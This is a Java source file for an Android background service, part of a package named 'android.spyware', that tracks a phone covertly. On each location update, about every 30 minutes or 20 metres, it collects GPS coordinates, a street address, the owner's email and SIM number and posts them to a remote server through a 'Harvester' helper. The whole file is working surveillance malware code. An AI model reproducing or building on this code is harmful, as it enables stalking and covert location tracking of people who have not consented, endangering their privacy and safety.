package android.spyware;

import android.Manifest;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.support.v4.app.ActivityCompat;
import android.util.Log;

import java.util.Date;

import static android.spyware.Spyware.DEV_MODE;
import static android.spyware.Spyware.TAG;

/**
 * This is the tracker Service.
 */
public class TrackerS extends Service {
    private static final long MIN_DISTANCE_CHANGE_FOR_UPDATES = 20; // 20 meters
    private static final long MIN_TIME_BW_UPDATES = 1000 * 60 * 30; // 30 minutes

    private Context context;
    private Harvester harvester;
    private LocationManager mLocationManager;
    private LocationListener mLocationListener;

    @Override
    public void onCreate() {
        super.onCreate();
        if (DEV_MODE)
            Log.i(TAG, "::INF  Tracker service running...");

        context = getApplication();
        harvester = new Harvester(context);
        mLocationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
        mLocationListener = new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {
                if (DEV_MODE)
                    Log.i(TAG, "::INF  onLocationChanged: " + location);

                if (harvester.isNetworkConnected()) {
                    String address = Position.getAddress(context, location.getLatitude(), location.getLongitude());
                    Position currentLocation = new Position(harvester.getEmail(), harvester.getSim().get("simNo"),
                            address, location.getLongitude(), location.getLatitude(), location.getAltitude(),
                            location.getAccuracy(), location.getProvider(), new Date(location.getTime()));
                    Param mParams = new Param("Tracker", currentLocation.toJSON());
                    AsyncTask<Param, Void, Integer> PostJObject = new PostDataAT();

                    try {
                        PostJObject.execute(mParams);

                        if (PostJObject.get().equals(200)) {
                            if (DEV_MODE)
                                Log.i(TAG, "::INF  Tracker: Position successfully sent.");
                        }
                    } catch (Exception e) {
                        Log.wtf(TAG, "::ERR  " + Log.getStackTraceString(e));
                    }
                } else
                    Log.wtf(TAG, "::ERR  Tracker: No internet connectivity.");
            }

            @Override
            public void onProviderDisabled(String provider) {
                if (DEV_MODE)
                    Log.d(TAG, "::DEB  onProviderDisabled: " + provider.toUpperCase());

                setLocationListener();
            }

            @Override
            public void onProviderEnabled(String provider) {
                if (DEV_MODE)
                    Log.d(TAG, "::DEB  onProviderEnabled: " + provider.toUpperCase());

                setLocationListener();
            }

            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {
                if (DEV_MODE)
                    Log.d(TAG, "::DEB  onStatusChanged: " + provider.toUpperCase());
            }
        };

        setLocationListener();
    }

    private void setLocationListener() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
                    ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                if (DEV_MODE)
                    Log.wtf(TAG, "::ERR  TrackerS.setLocationListener(): ACCESS_FINE_LOCATION and ACCESS_COARSE_LOCATION permissions not granted.");
                return;
            }
        }

        Criteria criteria = new Criteria();

        if (mLocationManager.getBestProvider(criteria, true) != null) {
            mLocationManager.requestLocationUpdates(
                    mLocationManager.getBestProvider(criteria, true),
                    MIN_TIME_BW_UPDATES,
                    MIN_DISTANCE_CHANGE_FOR_UPDATES,
                    mLocationListener
            );
        } else
            Log.wtf(TAG, "::ERR  All the location providers are disabled.");
    }

    @Override
    public void onDestroy() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
                    ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                if (DEV_MODE)
                    Log.wtf(TAG, "::ERR  TrackerS.onDestroy(): ACCESS_FINE_LOCATION and ACCESS_COARSE_LOCATION permissions not granted.");
                return;
            }
        }

        if (DEV_MODE)
            Log.i(TAG, "::INF  Tracker service terminated.");

        if (mLocationManager != null) {
            mLocationManager.removeUpdates(mLocationListener);
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO Auto-generated method stub
        return null;
    }
}
